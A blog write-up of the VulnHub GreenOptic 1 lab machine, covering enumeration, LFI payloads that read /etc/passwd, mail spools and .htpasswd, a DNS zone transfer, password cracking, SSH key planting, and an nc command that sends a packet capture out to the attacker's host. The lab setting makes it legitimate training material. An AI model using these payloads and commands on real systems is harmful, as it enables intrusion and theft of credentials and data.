---
title: VulnHub - GreenOptic 1
layout: post
date: 2020-08-30 15:00:00 +0800
---

![311acdccb63fff89d426a2dde5eb467c.png](/images/vh-greenoptic1/2bcae0a0a91e45a19d263c21439c6fda.png)

### 0. Preface

This box has tons of enumeration. Tons. Pretty interesting box in terms of what kind of enumeration and analysis you have to do, but honestly it's nothing we haven't seen before so far. 

In this box, we will be tackling: 

1. Reading files using LFI
2. DNS zone transfers
3. Decoding some Base64
4. Wireshark PCAP Analysis

<!--excerpt-->

---

### 1. Preliminary NMAP Scan

```bash
sudo nmap -sC -sV -oN nmap.txt 192.168.32.12 -v
```

![e74a7514cc8d9dba8c6363fe624ed968.png](/images/vh-greenoptic1/3a0fcdd1226e448f8c802d40bad582b2.png)

This box seems to be running either RHEL 7 or CentOS. We see a couple of ports open - 21 (FTP), 53 (DNS), 80 (HTTP), and something unfamiliar on port 10000. 

After a bit of googling, we find that it is indeed running [Webmin MiniServ](http://www.webmin.com/apache.html) as per the service validation done by `nmap`.

This also seems to be running Apache httpd for the web server.

### 2. Web Server Enumeration

Let's first try anonymous FTP. 

![8bad54334f9c301f2df8e2b2431fd4d6.png](/images/vh-greenoptic1/046854a555f34e098ba845aaa6cc66a9.png)

That didn't work, so let's move on to the web server on port 80. 

![8dcc3ec51c5a3c4ddbb41f11bf0d122f.png](/images/vh-greenoptic1/d33be290319e4d8882508538d7924d17.png)

First, let's see if this is running on html or php by appending  `/index.html` and `/index.php` to the page. 

![a398389af75ee053eb3a3bd4bf4eefaa.png](/images/vh-greenoptic1/aa09560f25aa47e2b78a55524184b98a.png)

Great, we can confirm that this is running html. Let's use `gobuster` to look for subdirectories and other html pages with the `-x html` switch. 

```text
gobuster dir -u http://192.168.32.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html -o gobuster.txt
```

![3b4549bdc53cde0913165d65074d23eb.png](/images/vh-greenoptic1/765f7131a2c14150bc281474736738cf.png)

Let's try accessing `/account`. 

![286b461729f95995220472a6f170451f.png](/images/vh-greenoptic1/4226c531c6c84d8685418ea7a2718f71.png)

This page seems to be running on PHP. Immediately, we notice the potential for LFI on the URL. Notice the  `/index.php?include=cookiewarning`? If this is vulnerable, we can replace the `?include=cookiewarning` with `?include=../../../../../../etc/hosts`.

![49cbc81adb0df3ae732d072c3ae6510b.png](/images/vh-greenoptic1/e837e977f7ef4f4d96c16e2d274c152a.png)

Awesome, we got something that is vulnerable to LFI. After fuzzing a bit, we find the root directory of the Apache web server at `/var/www/html`. 

![be49d2390292b34460d5f1ca08edfa1f.png](/images/vh-greenoptic1/bb3b8f2eb4c14c9e9261ff4f2521ddd6.png)

There's not much else we can do here, so let's move on to Webmin. 

![52831fded97156c5c6ed2d0c1f9ca9f5.png](/images/vh-greenoptic1/139fe292273f4c4989ad529407c73709.png)

Interesting. Let's add `greenoptic.vm` and `websrv01.greenoptic.vm` to `/etc/hosts` and visit the Webmin page again on `https://websrv01.greenoptic.vm:10000`

![c45622b9ee0cd9121bb76c926714ab6c.png](/images/vh-greenoptic1/b4901c9db9a34bb5a3f2ffca96c7f228.png)

Let's see if there anything interesting on the SSL certificate. 

![12a212257ee8781b7b3b85844959f0c0.png](/images/vh-greenoptic1/66ef07dc91c24ecaa718ba7d3b35d762.png)

Nothing here. 

### 3. DNS Zone Transfer, More Web Server Enumeration

Now that we have a hostname, let's try to do a DNS zone transfer using `dig`. 

```text
dig axfr @192.168.32.12 greenoptic.vm
```

![f6128c8079f5927260aa3c38a8bf7de8.png](/images/vh-greenoptic1/fef66e434b144ccba333fbcae60c5185.png)

Great, now we have a list of hosts that are available on the box. Since we do not have a username that we can use with Webmin, let's go back to LFI. 

Let's go for the `/etc/passwd` file to see what users are available to us. From here on, we will be using `php://filter/convert.base64-encode/resource=` to LFI. This converts the document that we are including to Base64, which we can decode in our terminal using `echo B64STRINGHERE | base64 -d`. This gives us a cleaner output with proper line breaks. 

```text
/account/index.php?include=php://filter/convert.base64-encode/resource=/etc/passwd
```

![b4794daa0679cd3c3e3dd37f671b0ba2.png](/images/vh-greenoptic1/f1577ea403474e8bb74e25505368eebe.png)

We have three potential users from this - `terry`, `sam`, `alex` and `monitor`. From the user list, we can also see that this is potentially running postfixd and dovecot. 

Let's try to get some emails. 

```text
/account/index.php?include=php://filter/convert.base64-encode/resource=/var/mail/terry
```

![48d1b144c76d8561895d57b7d69ee6fd.png](/images/vh-greenoptic1/66219779e0a849fa9b6ac8b4da748c54.png)

```text
/account/index.php?include=php://filter/convert.base64-encode/resource=/var/mail/sam
```

![45f11885a6d3525ef74660ca4b01f299.png](/images/vh-greenoptic1/9ce0df7a7a854e92bc3a93bdbb7a19d6.png)

We have one password with an unknown username, and a proper password combo - `?:HelloSunshine123` and `terry:wsllsa!2`. We are unable to login to Webmin or `/account` with the usernames we have and the passwords we found.  

Let's move on to `recoveryplan.greenoptic.vm`, which we found from the DNS zone transfer we did earlier. 

![0eed79061a604c67f528f3f4eb692e73.png](/images/vh-greenoptic1/1ae854e097314680b04e73b3f4a5869d.png)

Same thing, we are unable to login with any of the credentials we found. Since we know this is running Apache httpd, we can try get the `.htpasswd` file like so.

```text
/account/index.php?include=php://filter/convert.base64-encode/resource=/var/www/.htpasswd
```

![6ec893b628e877bb8090a3c87d3324cb.png](/images/vh-greenoptic1/7834fec21f8f435fbd167d661b3c3ad4.png)

Awesome, let's bruteforce this with `john`.

```text
sudo john --wordlist:/usr/share/wordlists/rockyou.txt htpasswd
sudu john --show htpasswd
```

![bd45dfe9a01a776452340d6476b44e3c.png](/images/vh-greenoptic1/d58ea6a478dc4b8891595d58a20e0046.png)

We have ourselves some credentials - `staff:wheeler`. Let's login to `recoveryplan.greenoptic.vm` with those.

![5c79023076885c1e4ab01cfcecc227b2.png](/images/vh-greenoptic1/baa5413d3b484b2fae76d7d83cf9793d.png)

### 4. Wireshark PCAP Analysis #1

Now that we are logged in and we have `terry`'s phpBB password as found earlier in `/var/mail/terry`, we can login to phpBB. 

![0afa6055ed21adb32c3cbe23de146655.png](/images/vh-greenoptic1/9a4a142196de489e9f8bff871266a1bd.png)

Poking around, we find a Team Message. 

![1e4e8d12abd23c284323f0adcd719152.png](/images/vh-greenoptic1/7cdb1d44b61547bbbb0f80738f23703e.png)

Recall in one of the emails we found a password without a username? And the email also did mention something about a team message? 

Let's download the zip file and extract it with `HelloSunshine123`.  

![c695a42f0e46637d45573aff5e214322.png](/images/vh-greenoptic1/0d4fae40e6ac4667951d80a290810214.png)

It contains a pcap. Time for some analysis. Let's fire up Wireshark and look through tcp streams. 

![4341e1fbf0d926eee03d2d0943b345dd.png](/images/vh-greenoptic1/f33290d0f9454f9b886602eec05a292c.png)

At tcp stream 25, we see ftp authentication with `alex:FwejAASD1`. Let's try to login with those credentials to ftp. 

![4e7bf12d1d64b50e1e3e7239bf185e57.png](/images/vh-greenoptic1/66ac0213856648a0b99eb59e95dedf82.png)

Awesome, we got user.txt. 

### 5. Wireshark PCAP Analysis #2, Root

Now to get a proper shell. Let's create a `.ssh` folder in `alex`'s home directory, then generate an ssh key with `ssh-keygen`. Upload the public key (`id_rsa.pub`) to that folder. Don't forget to rename it to `authorized_keys`.

![58e99179d2d77bf2db3134ffa5143c48.png](/images/vh-greenoptic1/7cdcb6a40d4a4d2b9a339afb4f3e40a6.png)

Now we are able to login with the private key. 

![d2808497892350ef61c7147efce12ce6.png](/images/vh-greenoptic1/ad68fad640db468ca832ee1dd735f35d.png)

Notice in `id` that `alex` is part of the wireshark group? Let's see what that group can run on this box. 

```text
find / -type f -group wireshark 2>/dev/null
```

![4f74aa26dd566ba9dd6c07882e0a8b3c.png](/images/vh-greenoptic1/f58b3ac0a7994e6792968d265c908fbb.png)

Interesting. It seems like the we are able to run `dumpcap`. `dumpcap` is a binary that [comes together with Wireshark](https://www.wireshark.org/docs/man-pages/dumpcap.html), which allows packet capture into a pcap file directly from the terminal. 

Let's see what interfaces are available to us with the `-D` switch. 

```text
dumpcap -D
```

![d4b6f18fd49ef191a22160c2bec8adbe.png](/images/vh-greenoptic1/f2a4005bef1146c2b17731840bd14989.png)

Let's do a pcap on all interfaces. More is better than less (*sometimes*).

```text
dumpcap -i any
```

![c54c5dd5f5bdc8e7a8fd2a9f18c8a141.png](/images/vh-greenoptic1/73ca585052ca4f4382eafb0c05424553.png)

Now that we have done the pcap, we find that there is no way to transfer files off this box. Let's upload `nc` from our local machine using a python3 http.server. 

![e13b048a483cc91004efb363a2cd8c53.png](/images/vh-greenoptic1/d3a508ae577d416b8769935bbb2ec78c.png)

Now we can transfer the pcap using `nc`.

```bash
#Remote machine: 
nc -w 3 192.168.32.4 8000 < wireshark_pcapng_*

#Local machine: 
nc -lvnp 8000 > wireshark.pcap
```

![1c4f68db70adcdb54c5a01aeb180cc8f.png](/images/vh-greenoptic1/2f69c28638a24256972f57fb9f54c0cf.png)

Time for another pcap analysis with Wireshark. Since we are capturing on all interfaces, we need to filter out the SSH traffic between our box and the remote machine.

```wireshark
!(ip.src == 192.168.32.0/24)
```

![008aba88642425d823f8e09093235414.png](/images/vh-greenoptic1/2febf4225ba5480bbdeb231c12d885b3.png)

Looking at the tcp traffic, there seems to be something on the loopback adapter. Let's follow the tcp streams again. 

![8e431718065c18bca411505befb63820.png](/images/vh-greenoptic1/099b9b47a6794226b382eff88831b60f.png)

We see some traffic going to the Postfix SMTP server that is trying to send plain text authentication. For Postfix SMTP, [plain text authentication is encoded with Base64](http://www.postfix.org/SASL_README.html#server_test). We can decode that in our terminal, same as what we did for the Base64 encoded LFI earlier. 

```text
echo AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 -d
```

![ca677fd4b5732611d3373fb0d645cf85.png](/images/vh-greenoptic1/6629b6b7662a4c18bd99523fc5980fae.png)

Now we got the `root` credentials - `root:ASfojoj2eozxczzmedlmedASASDKoj3o`, which we can simply make use of by running `su - root` in the SSH session. 

![419ebfd23188ba89b9d97b12c4024ce3.png](/images/vh-greenoptic1/80b7339340dd40a295ce357334279458.png)